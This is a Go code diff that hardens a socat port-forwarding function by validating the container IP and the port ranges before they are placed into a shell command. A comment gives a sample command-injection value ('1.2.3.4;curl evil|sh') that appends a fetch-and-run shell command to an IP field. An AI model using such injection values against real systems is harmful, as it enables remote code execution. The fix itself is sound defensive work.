@@ -22,6 +22,7 @@ import (
 	"time"
 
 	"github.com/OpenIDCSTeam/HostAgent-Go/internal/model"
+	"github.com/OpenIDCSTeam/HostAgent-Go/internal/security"
 )
 
 // PortForwardEntry 一条 socat 端口转发记录
@@ -168,6 +169,15 @@ func (p *portForward) addPortForward(containerIP string, lanPort, wanPort int, p
 	protocol = strings.ToUpper(protocol)
 	if protocol != "TCP" && protocol != "UDP" {
 		return fmt.Errorf("不支持的协议类型: %s", protocol)
+	}
+
+	// 容器地址来自虚拟机配置，是用户可控值，直接拼进 shell 命令可被注入
+	// （例如 1.2.3.4;curl evil|sh）。socat 的目标只接受 IP，这里严格校验。
+	if err := security.ValidateIP(containerIP); err != nil {
+		return fmt.Errorf("端口转发失败: %w", err)
+	}
+	if lanPort <= 0 || lanPort > 65535 || wanPort <= 0 || wanPort > 65535 {
+		return fmt.Errorf("端口转发失败: 端口超出范围 (%d -> %d)", wanPort, lanPort)
 	}
 
 	cmd := fmt.Sprintf("nohup socat %s-LISTEN:%d,reuseaddr,fork %s:%s:%d > /dev/null 2>&1 &",
